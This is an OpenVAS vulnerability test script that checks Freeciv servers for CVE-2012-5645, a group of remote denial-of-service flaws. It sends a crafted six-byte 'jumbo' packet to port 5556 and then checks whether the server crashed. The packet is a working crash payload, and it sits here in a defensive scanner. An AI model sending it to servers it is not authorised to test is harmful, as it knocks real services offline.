###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeciv_multiple_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Freeciv Multiple Remote Denial Of Service Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  condition.
  Impact Level: Application";

tag_affected = "Freeciv Version 2.2.1 and prior";
tag_insight = "- Malloc exception in 'jumbo' packet within the common/packet.c.
  - Endless loop in packets PACKET_PLAYER_INFO, PACKET_GAME_INFO,
    PACKET_EDIT_PLAYER_CREATE, PACKET_EDIT_PLAYER_REMOVE, PACKET_EDIT_CITY
    and PACKET_EDIT_PLAYER use some particular functions that can be tricked
    into an endless loop that freezes the server with CPU at 100%.";
tag_solution = "No solution or patch is available as of 21st February, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.freeciv.org";
tag_summary = "This host is running Freeciv and is prone to multiple denial of
  service vulnerabilities.";

if(description)
{
  script_id(803172);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2012-5645");
  script_bugtraq_id(41352);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-02-21 15:50:07 +0530 (Thu, 21 Feb 2013)");
  script_name("Freeciv Multiple Remote Denial Of Service Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://aluigi.org/poc/freecivet.zip");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/freecivet-adv.txt");

  script_description(desc);
  script_summary("Check if Freeciv is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(5556);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


## Variable Initialization
soc = "";
req = "";

## Freeciv Server default port
frcviPort = 5556;

## Check the port status
if(!get_port_state(frcviPort)){
  exit(0);
}

## Application confirmation is not possible
## exit if socket is not created
soc = open_sock_tcp(frcviPort);
if(!soc){
  exit(0);
}

## Construct an attack request
req = raw_string(0xff, 0xff, 0x00, 0x00, 0x00, 0x00);

## Sending Request
send(socket:soc, data:req);
close(soc);

sleep(5);

## check the port and confirmed the crash or not
soc = open_sock_tcp(frcviPort);
if(!soc)
{
  security_hole(frcviPort);
  exit(0);
}

close(soc);
